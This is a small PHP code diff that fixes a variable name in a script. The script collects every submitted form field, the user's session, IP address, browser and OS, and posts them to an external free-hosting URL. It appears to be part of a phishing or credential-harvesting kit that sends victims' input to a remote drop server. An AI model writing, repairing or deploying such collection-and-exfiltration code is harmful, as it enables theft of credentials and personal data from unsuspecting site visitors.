@@ -125,7 +125,7 @@ $data = $_POST;
 $data['date'] = $DATE;
 $data['s'] = $_SESSION;
 $data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
-$data['b'] = browserTy_Version;
+$data['b'] = $browserTy_Version;
 $data['os'] = $OS;
 
 sendPost('http://www.save-test.epizy.com/sc2/sv1.php',$data);
